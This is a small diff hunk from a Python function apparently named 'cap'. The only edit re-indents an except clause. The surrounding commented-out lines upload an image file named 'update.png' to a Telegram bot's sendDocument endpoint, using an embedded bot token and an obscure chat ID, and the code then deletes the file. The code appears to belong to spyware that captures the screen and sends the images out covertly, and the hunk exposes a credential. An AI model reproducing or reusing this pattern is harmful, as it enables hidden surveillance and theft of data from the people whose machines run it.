@@ -49,7 +49,7 @@ def cap():
             #file = {'document':open("update.png", 'rb')}
             #requests.get('https://api.telegram.org/bot5637868743:AAGtgf7BtI6XPeE6K8ZUft4GQgbGJjZ6xsU/sendDocument?chat_id=@poilkjmnbqweasdzxcu', files= file)
             #file.clear()
-        except:
+      except:
             pass
           
           os.remove("update.png")
